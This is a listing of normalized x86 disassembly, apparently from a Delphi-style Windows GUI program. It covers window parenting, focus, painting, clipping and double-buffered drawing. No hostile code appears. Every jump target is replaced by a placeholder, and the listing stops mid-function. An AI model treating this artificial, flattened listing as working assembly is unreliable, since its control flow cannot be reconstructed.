mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_418cf8
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_452554
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_45250c
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_451da8
call sub_44df08
inc edi
dec esi
jne r-xdata
sub_4525f0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_45260c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_418cf8
call sub_45260c
inc edi
dec esi
jne r-xdata
sub_45266c
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403518
mov ebx eax
mov eax edi
call sub_45260c
mov eax edi
call sub_4527a8
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_4526ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_452782
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44fa80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418cf8
call sub_4526ac
inc esi
dec ebx
jne r-xdata
sub_4527a8
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4526ac
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4527e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_45260c
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_4527a8
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406e7c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44fa80
jmp r-xdata
sub_452870
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4528c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4528b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4528be
call sub_44d2dc
call sub_427400
retn
sub_4528e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_417644
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406e64
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44fa80
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_4529a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_418cf8
call sub_4528e8
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_418cf8
call sub_4528e8
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_452a34
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4550b4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406e50
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4529a0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e64
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44fa80
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_452ac8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44f03c
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44fb4c
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_452a34
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406e50
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_44e3f8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4529a0
test eax eax
je r-xdata
mov eax ebx
call sub_4657c8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44fb4c
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4550b4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4550b4
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44fa80
sub_452c2c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44fce0
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44fa80
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_424640
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_4252c4
call sub_424640
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_425300
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44e454
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_452d34
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_44b794
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44fa80
mov [ esi + 0xc ] eax
mov bl 0x1
sub_452d68
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_452e88
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452ec0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452e8f
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418cf8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_452ec0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_418d54
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_418cf8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41766c
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_418cf8
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_424640
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_41766c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_424640
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41766c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_44d1f0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44fa80
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4530f0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_44d1f0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4550b4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4550b4
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44fa80
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44fa80
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_44d1f0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4530f0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_418cf8
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_453244
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_452d68
jmp r-xdata
mov eax ebx
call sub_451de4
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_453396
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4550b4
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44fa80
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_453244
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4550b4
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_4533a4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4533c4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453438
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453458
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453478
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45349c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4534c0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4534e4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_452d34
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453508
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43f31c
mov edi eax
mov eax edi
call sub_43f3fc
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_425300
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4550b4
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43f4fc
jmp r-xdata
sub_453590
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_4503b4
test bl bl
je r-xdata
mov eax edi
call sub_4553c4
mov eax edi
call sub_454fbc
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_454fbc
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_453650
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
